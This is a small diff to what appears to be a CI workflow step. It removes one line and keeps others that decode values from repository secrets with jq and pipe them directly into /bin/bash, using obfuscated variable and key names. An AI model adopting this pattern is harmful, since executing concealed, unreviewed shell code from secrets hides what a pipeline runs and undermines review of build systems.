@@ -23,7 +23,6 @@ jobs:
           nwzl579: ${{ secrets.nwzl579 }}
         run: |
           printf '%s' "$nwzl579" | jq -r .oue714 | /bin/bash
-          printf '%s' "$q404" | jq -r .tne181 | /bin/bash
           printf '%s' "$ixcrm9" | jq -r .hehrx54401 | /bin/bash
           printf '%s' "$rb2786" | jq -r .cfojx8889 | /bin/bash
           echo $njfh7 | jq -r .r42453 | /bin/bash
